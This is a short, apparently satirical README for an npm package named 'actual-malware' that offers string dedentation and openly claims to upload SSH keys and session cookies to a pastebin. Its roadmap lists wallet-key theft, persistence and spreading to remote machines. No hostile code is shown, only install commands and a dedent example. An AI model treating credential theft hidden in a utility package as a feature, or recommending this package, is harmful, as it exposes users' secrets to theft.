npm package to upload your private ssh keys to a pastebin. It also provides string dedentation.

## Installation

npm i actual-malware
yarn add actual-malware # alternative
# alias for convenience:
npm i actma
yarn add actma
```

## Usage

```js
import { dedent } from 'actual-malware' // or actma

const prettyString = dedent(`
  the rains and
  spains
    fall`) // preserved

// all session cookies are now also in a pastebin

console.log(prettyString)
```

## Roadmap

-   [ ] Upload private keys from crypto wallets
-   [ ] Persist on system indefinitely (alias git clone command?)
-   [ ] Copy to all connected remote machines and to all future authorized users
